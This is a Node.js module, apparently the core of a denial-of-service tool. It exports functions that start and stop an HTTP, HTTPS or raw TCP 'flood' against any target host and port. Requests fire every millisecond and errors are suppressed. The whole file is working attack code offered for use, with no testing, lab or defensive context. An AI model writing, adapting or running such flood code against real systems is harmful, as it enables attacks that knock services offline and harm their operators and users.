const http = require('http');
const https = require('https');
const net = require('net');

let floodInterval = null;

const startFlood = (target, port, type) => {
  if (floodInterval) {
    return 'Flood is already running!';
  }

  if (type === 'http') {
    floodInterval = setInterval(() => {
      http.get(`http://${target}:${port}`, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
      }).on('error', (err) => {});
    }, 1);
  } else if (type === 'https') {
    floodInterval = setInterval(() => {
      https.get(`https://${target}:${port}`, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
      }).on('error', (err) => {});
    }, 1);
  } else if (type === 'tcp') {
    floodInterval = setInterval(() => {
      const client = new net.Socket();
      client.connect(port, target, () => {
        client.write('GET / HTTP/1.1\r\n\r\n');
      });
      client.on('data', () => {
        client.destroy();
      });
      client.on('error', () => {
        client.destroy();
      });
    }, 1);
  } else {
    return 'Invalid flood type! Use "http", "https" or "tcp".';
  }

  return `Started ${type} flood on ${target}:${port}`;
};

const stopFlood = () => {
  if (!floodInterval) {
    return 'No flood is running!';
  }

  clearInterval(floodInterval);
  floodInterval = null;

  return 'Stopped flood';
};

module.exports = {
  startFlood,
  stopFlood,
};
